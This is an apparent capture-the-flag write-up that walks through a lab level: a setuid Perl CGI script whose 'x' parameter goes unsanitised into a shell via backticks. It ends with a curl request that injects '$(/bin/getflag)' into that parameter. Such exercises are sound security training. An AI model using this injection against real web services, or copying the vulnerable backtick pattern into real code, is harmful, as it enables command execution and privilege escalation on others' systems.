# level04

## Scanning

**1. Who are we ?**
```sh
$ id
uid=2004(level04) gid=2004(level04) groups=2004(level04),100(users)
```

**2. Where are we ?** 👀
```sh
$ ls -laR
.:
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```

## Solution

The perl script `/home/user/level04/level04.pl` seems suspicious.

**Privileges**

We determined it is a prime candidate for privilege escalation because:
- It is owned by `flag04` (our target).
- The group owner is `level04` (which matches our user's group).
- It has the `setuid permission bit` (`s`) set, for the group, which grants us the owner's privileges during the program's execution.

This means that, during script execution through the user `level04`, the privilege state is as follows:  
- Real UID: `level04`
- Real GUID: `level04`
- Effective UID: `flag04`
- Effective GUID: `level04`

**Script content**

When executing it we an output indicating usage of the HTTP protocol.
```sh
$ ./level04.pl 
Content-type: text/html



```

Perl is an **interpreted language**. And the file is readable. Let's take advantage of that:
```pl
$ cat ./level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

It seems to setup a [CGI script](https://www.geeksforgeeks.org/perl/perl-cgi-programming/) (see also doc who's easier to read [link](http://www-igm.univ-mlv.fr/~dr/XPOSE2001/CGIavecPerl/cgi.html)).

The script is dependent on an HTTP server. Let's identify if one is running and it's nature. We can notice the presence of a **master process** owned by ***root*** and some **workers** owned by ***www-data***.
```sh
ps aux | grep -E "[n]ginx|[a]pache|[h]ttpd"
root      1512  0.0  0.3  21340  6188 ?        Ss   10:23   0:00 /usr/sbin/apache2 -k start
www-data  1572  0.0  0.1  21364  3564 ?        S    10:23   0:00 /usr/sbin/apache2 -k start
www-data  1573  0.0  0.1  21364  3564 ?        S    10:23   0:00 /usr/sbin/apache2 -k start
www-data  1574  0.0  0.1  21364  3564 ?        S    10:23   0:00 /usr/sbin/apache2 -k start
www-data  1575  0.0  0.1  21364  3564 ?        S    10:23   0:00 /usr/sbin/apache2 -k start
www-data  1576  0.0  0.1  21364  3564 ?        S    10:23   0:00 /usr/sbin/apache2 -k start
```

From what we can understand, the process should roughly act the following way:
1. Provide a shebang specifying it must be, by default, executed by `/usr/bin/perl`
2. A comment indicating it is hosted on localhost:4747.
3. Load the `CGI` module and import it's `param` function.
4. Print an HTTP response header (`Content-type: text/html`) to *stdout* which is intended to be processed by *Apache2* through CGI.
5. It defines a function called `x` that executes the shell command `echo $y 2>&1`, where `$y` is replaced by first argument passed to the function. It then prints the captured output.
6. It calls the function `x` and passes it the value of the HTTP `query parameter x`.


**Vulnerability**

The script allows HTTP parameter injection through the **x query parameter** via [CGI](https://www.ibm.com/docs/en/i/7.6.0?topic=functionality-cgi). This value is directly passed into a spawned shell command (through Perl backticks), with **effective flag04 privileges**.
```sh
$ curl 'localhost:4747/?x=$(/bin/getflag)'
```

And there is the flag !
